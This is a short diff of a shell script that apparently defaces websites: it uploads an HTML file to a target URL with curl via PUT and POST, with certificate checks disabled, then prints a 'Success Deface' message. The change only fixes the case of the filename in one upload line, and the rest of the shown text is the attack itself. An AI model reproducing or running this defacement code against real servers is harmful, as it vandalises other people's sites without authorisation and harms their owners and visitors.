@@ -43,6 +43,6 @@ if [ -z "$1" ]; then
 fi
 
 echo
-curl -k -T index.html $1
+curl -k -T Index.html $1
 curl -k -X POST -F Index.html $1
 echo -e $blue"Success Deface $red"$1"/index.html"
